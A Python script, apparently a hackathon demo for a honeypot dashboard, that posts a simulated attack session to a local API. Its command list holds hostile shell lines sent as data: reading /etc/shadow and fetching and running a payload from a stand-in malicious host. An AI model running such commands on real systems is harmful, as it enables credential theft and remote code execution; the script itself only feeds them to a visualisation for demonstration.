import time
import requests
import sys

API_URL = "http://127.0.0.1:8000/api"

def print_hack(msg):
    print(f"\033[92m[+]\033[0m {msg}")

def print_err(msg):
    print(f"\033[91m[-]\033[0m {msg}")

def main():
    print("\n\033[1m\033[93mCHAMELEON ATTACK SIMULATOR (HACKATHON DEMO)\033[0m\n")
    print_hack("Initializing external threat payload...")
    time.sleep(1.5)

    # Step 1: Launch Attack
    attack_payload = {
        "country": "IN",
        "ip": "115.110.12.99",
        "target_node": "aurora"
    }
    
    print_hack(f"Launching simulated attack from {attack_payload['ip']} (IN) targeting '{attack_payload['target_node']}' node...")
    
    try:
        r = requests.post(f"{API_URL}/simulate/attack", json=attack_payload)
        if r.status_code != 200:
            print_err(f"Backend rejected attack: {r.text}")
            sys.exit(1)
        
        session_id = r.json().get("session_id")
        print_hack(f"Attack successful. Session created: {session_id}")
        print_hack("Look at the globe! You should see a red laser arc flying from India to the US.")
    except Exception as e:
        print_err(f"Connection failed. Is the backend running on port 5000? {e}")
        sys.exit(1)

    # Step 2: Stream Commands
    commands = [
        "whoami",
        "uname -a",
        "cat /etc/shadow",
        "wget http://malware.ru/payload.sh",
        "chmod +x payload.sh",
        "./payload.sh --silent"
    ]

    print("\n\033[1m\033[94m[+] Streaming Interactive Session Commands...\033[0m")
    time.sleep(2)

    for cmd in commands:
        print(f"   > Typing: {cmd}")
        time.sleep(len(cmd) * 0.1) # Simulate typing delay
        
        requests.post(f"{API_URL}/simulate/command", json={
            "session_id": session_id,
            "command": cmd
        })
        
        time.sleep(1.5) # Wait before next command
        
    print("\n\033[92m[+] Attack simulation complete! Check the Intruder Sessions page.\033[0m\n")

if __name__ == "__main__":
    main()
